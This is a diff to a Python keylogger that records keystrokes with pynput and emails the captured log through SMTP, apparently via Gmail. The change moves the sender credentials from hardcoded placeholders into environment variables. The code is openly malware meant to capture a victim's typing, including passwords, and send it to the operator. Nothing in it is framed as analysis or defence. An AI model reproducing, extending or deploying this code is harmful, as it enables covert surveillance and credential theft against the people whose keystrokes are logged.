@@ -4,6 +4,9 @@ import pynput.keyboard
 import threading
 import smtplib
 from email.mime.text import MIMEText
+import os
+from dotenv import load_dotenv
+
 
 class Keylogger:
     def __init__(self):
@@ -11,6 +14,9 @@ class Keylogger:
         self.request_shutdown = False
         self.timer = None
         self.is_first_run = True
+        load_dotenv()
+        self.EMAIL_USER = os.getenv("EMAIL_USER")
+        self.EMAIL_PASS = os.getenv("EMAIL_PASS")
 
     def pressed_key(self, key):
         try:
@@ -34,7 +40,7 @@ class Keylogger:
 
     def report(self):
         email_body = "[+] El keylogger se ha iniciado exitosamente" if self.is_first_run else self.log
-        self.send_email("Keylogger Report", email_body, "test@test.com", ["test@test.com"], "mypassword...") # necesita una aplicacion en google para que llegue por gmail
+        self.send_email("Keylogger Report", email_body, self.EMAIL_USER, [self.EMAIL_USER], self.EMAIL_PASS) # necesita una aplicacion en google para que llegue por gmail
         self.log = ""   
         
         if self.is_first_run:
